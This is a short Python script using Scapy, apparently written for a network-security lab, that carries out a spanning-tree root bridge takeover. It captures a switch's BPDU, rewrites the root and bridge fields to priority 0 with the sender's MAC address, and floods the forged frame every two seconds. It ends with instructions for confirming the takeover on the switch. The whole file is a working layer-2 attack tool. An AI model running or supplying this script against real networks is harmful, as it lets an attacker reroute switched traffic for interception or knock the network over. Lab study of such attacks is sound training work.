#!/usr/bin/env python3
from scapy.all import *
import time, sys

"""
spanning-tree protocol Attack
Autor  : Edgardy Olivero 20250704
Lab    : EGALDITO_LAB
Uso    : sudo python3 STP-Root-Claim.py
"""


def main():
    iface = "eth0"

    print("[*] Esperando BPDU del switch (hasta 10 seg)...")
    # Captura UN bpdu real que manda el switch
    pkt = sniff(filter="ether dst 01:80:c2:00:00:00", iface=iface, count=1, timeout=10)

    if not pkt:
        print("[ERROR] No se recibio ningun BPDU. Verifica la interfaz.")
        sys.exit(1)

    # Muestra el paquete original
    print("\n[*] BPDU original capturado:")
    pkt[0].show()

    # Obtener MAC de Kali
    kali_mac = get_if_hwaddr(iface)
    print(f"\n[*] Modificando BPDU → Root: {kali_mac} | Priority: 0")

    # Modificar campos para reclamar Root Bridge
    pkt[0].src = kali_mac  # MAC origen = Kali
    pkt[0].rootid = 0  # Prioridad minima
    pkt[0].rootmac = kali_mac  # Kali es el Root
    pkt[0].bridgeid = 0  # Prioridad minima
    pkt[0].bridgemac = kali_mac  # Kali es el Bridge
    pkt[0].pathcost = 0  # Costo directo al root
    pkt[0].portid = 0  # Puerto ID minimo

    print("[*] BPDU modificado — iniciando ataque...")
    print("[*] Ctrl+C para detener\n")
    print("-" * 50)

    enviados = 0
    try:
        while True:
            sendp(pkt[0], iface=iface, verbose=False)
            enviados += 1
            print(f"[+] BPDU #{enviados:04d} enviado | Root: {kali_mac} | Priority: 0")
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n[!] Detenido. BPDUs enviados: {enviados}")
        print("\n[*] Verificar en SW2:")
        print("    SW2# show spanning-tree")
        print(f"    Buscar → Root ID Priority: 0  Address: {kali_mac}")


if __name__ == "__main__":
    main()
